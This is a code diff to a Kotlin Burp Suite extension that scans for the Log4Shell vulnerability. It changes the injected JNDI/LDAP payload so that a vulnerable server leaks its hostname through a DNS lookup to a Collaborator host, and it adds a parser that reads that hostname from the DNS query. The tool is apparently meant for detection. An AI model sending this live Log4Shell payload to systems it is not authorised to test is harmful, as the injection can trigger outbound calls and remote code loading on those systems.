@@ -64,7 +64,7 @@ class BurpExtender : IBurpExtender, IScannerCheck, IExtensionStateListener {
 
     override fun doActiveScan(baseRequestResponse: IHttpRequestResponse?, insertionPoint: IScannerInsertionPoint?): MutableList<IScanIssue> {
         val payload = collaborator.generatePayload(false)
-        val bytes = "\${jndi:ldap://$payload.${collaborator.collaboratorServerLocation}/s2test}".toByteArray()
+        val bytes = "\${jndi:ldap://\${hostName}.$payload.${collaborator.collaboratorServerLocation}/s2test}".toByteArray()
         val request = insertionPoint!!.buildRequest(bytes)
         val poff = insertionPoint.getPayloadOffsets(bytes)
         val hrr = callbacks.makeHttpRequest(baseRequestResponse!!.httpService, request)
@@ -104,8 +104,14 @@ class BurpExtender : IBurpExtender, IScannerCheck, IExtensionStateListener {
                 }
                 sb.append("</b> a request with a Log4Shell payload</p><ul>")
                 for (interaction in interactions) {
-                    sb.append("<li><b>")
-                    sb.append(interaction.getProperty("type"))
+                    val type = interaction.getProperty("type")
+                    if (type == "DNS") {
+                        sb.append("<li>By the host named <b>")
+                        sb.append(extractHostname(helpers.base64Decode(interaction.getProperty("raw_query"))))
+                    } else {
+                        sb.append("<li><b>")
+                        sb.append(type)
+                    }
                     sb.append("</b> at <b>")
                     sb.append(interaction.getProperty("time_stamp"))
                     sb.append("</b> from <b>")
@@ -135,4 +141,11 @@ class BurpExtender : IBurpExtender, IScannerCheck, IExtensionStateListener {
             }
         }
     }
+}
+
+private fun extractHostname(query: ByteArray): String? {
+    if (query[4] != 0.toByte() || query[5] != 1.toByte()) return null
+    val len = query[12].toInt()
+    if (len and 0xc0 != 0) return null
+    return query.decodeToString(startIndex = 13, endIndex = 13 + len)
 }
